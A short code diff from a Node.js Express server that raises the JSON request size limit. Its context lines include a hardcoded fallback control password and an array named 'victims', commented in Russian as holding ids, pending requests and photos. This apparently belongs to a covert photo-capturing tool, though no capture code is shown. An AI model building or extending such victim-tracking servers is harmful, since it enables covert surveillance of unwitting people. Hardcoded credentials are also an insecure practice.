@@ -8,7 +8,7 @@ const controlPassword = process.env.password || 'gAZan6742'
 const mainFrontend = fs.readFileSync('./main.html', 'utf8')
 const watchFrontend = fs.readFileSync('./watch.html', 'utf8')
 
-app.use(express.json());
+app.use(express.json({ limit: '10mb' }));
 
 let victims = []
 //айди, пендинг реквестс, фотка, номер фотки
